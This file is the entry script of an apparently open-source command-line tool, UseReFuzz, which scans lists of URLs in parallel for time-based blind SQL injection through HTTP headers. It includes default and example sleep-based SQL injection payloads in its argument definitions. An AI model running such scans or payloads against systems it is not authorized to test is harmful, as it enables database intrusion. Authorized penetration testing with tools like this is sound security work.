#!/usr/bin/env python3
try:
    from __init__ import headerInjector , multiPayload
except:
    from userefuzz import headerInjector , multiPayload

import colorama
import argparse
import os
import datetime
import configparser
import multiprocessing as mp
import sys
from functools import partial

# For Colouring on Windows based OS
colorama.init()

VERSION = '2.2.0'

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    SLANT = '\x1B[3m'

# Banner
banner=f""" 
{bcolors.FAIL}               (        (               
{bcolors.WARNING}               )\ {bcolors.FAIL})     ){bcolors.WARNING}\ )            
    (       ({bcolors.FAIL} (()/(  ( ({bcolors.WARNING}(){bcolors.FAIL}/(  {bcolors.WARNING}(         
    )\ (   ){bcolors.FAIL})\ /(_))){bcolors.WARNING})\ /(_)){bcolors.FAIL}))\ ({bcolors.WARNING}  (   
 _ ((_))\ /{bcolors.FAIL}((_|_)) /{bcolors.WARNING}((_|_{bcolors.FAIL}))_/((_{bcolors.WARNING}))\ )\ {bcolors.OKBLUE} 
| | | ((_|_)) | _ (_)) | |_(_))(((_|(_) 
| |_| (_-< -_)|   / -_)| __| || |_ /_ / 
 \___//__|___||_|_\___||_|  \_,_/__/__| {bcolors.SLANT}{bcolors.UNDERLINE}V {VERSION}{bcolors.ENDC} {bcolors.SLANT}{bcolors.UNDERLINE}@github.com/root-tanishq{bcolors.ENDC}
                                        
{bcolors.OKBLUE}
 [ 💉💉💉 {bcolors.ENDC}{bcolors.BOLD} Basic Header SQLI Injection Tester{bcolors.OKBLUE} 💉💉💉 ]{bcolors.ENDC}
 """

print(banner)

# Arguments
parser = argparse.ArgumentParser()
parser.add_argument('-l','--list', type=str,help=f'📄_List of URL to check for Header SQL Injection \t \t {bcolors.BOLD} {bcolors.OKBLUE}-l urllist.txt{bcolors.ENDC}',default="NO_LIST")
parser.add_argument('-p','--proxy', type=str,help=f'✈️ _Burp proxy or any other proxy to send the request \t \t{bcolors.BOLD} {bcolors.OKBLUE} -p http://127.1:8080{bcolors.ENDC}',default="NO_PROXY")
parser.add_argument('-m','--message', type=str,help=f'✉️ _Send a message in header for ease of search in Burp history \t \t{bcolors.BOLD} {bcolors.OKBLUE} -m "Just Testing SQLI"{bcolors.ENDC}',default="Testing for SQLI in User-Agent and Referer Header")
parser.add_argument('-s','--sleep', type=int,help=f'😴_How much sleep you want to use with custom payload \t \t{bcolors.BOLD} {bcolors.OKBLUE} -s 12 {bcolors.ENDC} Default Sleep = 10' , default=10)
parser.add_argument('-v','--verbose', help=f'💣_Display All URLs and output \t \t{bcolors.BOLD} {bcolors.OKBLUE} -v {bcolors.ENDC}', action='store_true' , default=False)
parser.add_argument('-o','--output', type=str,help=f'📁_Save the vulnerable URLs to an output file \t \t{bcolors.BOLD} {bcolors.OKBLUE} -o savefile {bcolors.ENDC}', default="NO_OUTPUT")
parser.add_argument('-u','--url', type=str,help=f'🤖_Pass a URL to check for Header SQLI Injections \t \t{bcolors.BOLD} {bcolors.OKBLUE} -u http://domain.tld/index.php {bcolors.ENDC}', default='NO_URL')
parser.add_argument('-ch','--customheader', type=str,help=f'🔒_Custom Header for SQLI Injections (For Multiple Header seperate them with | )\t \t{bcolors.BOLD} {bcolors.OKBLUE} FOR ONE HEADER: -ch X-Auth FOR MULTIPLE HEADER: -ch "X-Auth|X-Test|Bearer|Custom_HEAD" {bcolors.ENDC}', default="NO_CUSTOM_HEADER")
parser.add_argument('-w','--workers', type=int,help=f'👷_No. of workers (Processes) at a time \t \t{bcolors.BOLD} {bcolors.OKBLUE}-w 10 {bcolors.ENDC}\t \t Default Workers = 5',default=5)
parser.add_argument('-i','--inject', type=str,help=f"""💉_Send your custom payload Or a file of payloads for SQL Injection => `replace sleep with $UFZ$` \t \t{bcolors.BOLD} {bcolors.OKBLUE} -i "'+sleep($UFZ$)+'" -i sqli_payloads.txt{bcolors.ENDC} """ , default='"XOR(if(now()=sysdate(),sleep($UFZ$),0))XOR"')
args = parser.parse_args()


if args.customheader != 'NO_CUSTOM_HEADER':
    print(f'{bcolors.BOLD}{bcolors.OKGREEN}[{bcolors.ENDC}##{bcolors.BOLD}{bcolors.OKGREEN}]{bcolors.ENDC}',' Headers which UseReFuzz using for injection',bcolors.BOLD,bcolors.OKBLUE, args.customheader.replace('|',', '),bcolors.ENDC)
    print()
else:
    print(f'{bcolors.BOLD}{bcolors.OKGREEN}[{bcolors.ENDC}##{bcolors.BOLD}{bcolors.OKGREEN}]{bcolors.ENDC}',' Headers which UseReFuzz using for injection',bcolors.BOLD,bcolors.OKBLUE,'User-Agent, X-Forwarded-For, Referer',bcolors.ENDC)
    print()

if args.output != "NO_OUTPUT":
    print(f'{bcolors.BOLD} 📂 Logging Output of UseReFuzz to => {args.output}.md \n')
    file = open(args.output + ".md","w")
    # Custom Header
    if args.customheader != 'NO_CUSTOM_HEADER':
        output_ch = args.customheader.replace('|',', ')
    else:
        output_ch = 'User-Agent, X-Forwarded-For, Referer'
    file.write(f"""
# UseReFuzz HEADER SQLI INJECTION REPORT

> UseReFuzz runned on `{datetime.datetime.now()}`

- Headers `{output_ch}`

- Sleep used for checking `{args.sleep}`

# Report Results
| TIME TAKEN | URL | IS VULNERABLE | PAYLOAD |
| --- | --- | --- | --- |
""")
    file.close()

def main():
    # Already vuln check 
    alreadyVuln = []

    # Parsing 
    if args.url != "NO_URL":
        multiPayload(args.url,args.customheader,args.inject,args.message,args.proxy,args.output,args.verbose,args.sleep,alreadyVuln)
    elif args.list != "NO_LIST":
        try:
            urlList = filter(None , open(args.list,'r').read().split("\n"))
            with mp.Pool(args.workers) as worker:
                multiFuzz = partial(multiPayload, customHeaderMp=args.customheader,injectionPayloadMp=args.inject,userefuzzMessageMp=args.message,httpProxyMp=args.proxy,outputMp=args.output,verboseMp=args.verbose,sleepTimeMp=args.sleep,alreadyVulnMp=alreadyVuln)
                worker.map(multiFuzz , urlList)
        except KeyboardInterrupt:
            exit(0)
        except:
            if os.path.isfile(args.list):
                exit(0)
            else:
                print(f'😥{bcolors.BOLD}{bcolors.FAIL}_We are unable to read the file or the file does not exist{bcolors.ENDC}')
    elif not sys.stdin.isatty():
        try:
            urlFile = []
            for line in sys.stdin:
                try:
                    urlFile.append(line.split()[0])
                except:
                    pass
            with mp.Pool(args.workers) as worker:
                multiFuzz = partial(multiPayload, customHeaderMp=args.customheader,injectionPayloadMp=args.inject,userefuzzMessageMp=args.message,httpProxyMp=args.proxy,outputMp=args.output,verboseMp=args.verbose,sleepTimeMp=args.sleep,alreadyVulnMp=alreadyVuln)
                worker.map(multiFuzz , urlFile)
        except KeyboardInterrupt:
            exit(0)
        except:
            exit(0)
    else:
        print(f"😺{bcolors.WARNING}_No Option Provided please check {bcolors.ENDC}{bcolors.BOLD}# userefuzz --help {bcolors.ENDC}")

if __name__ == '__main__':
    main()
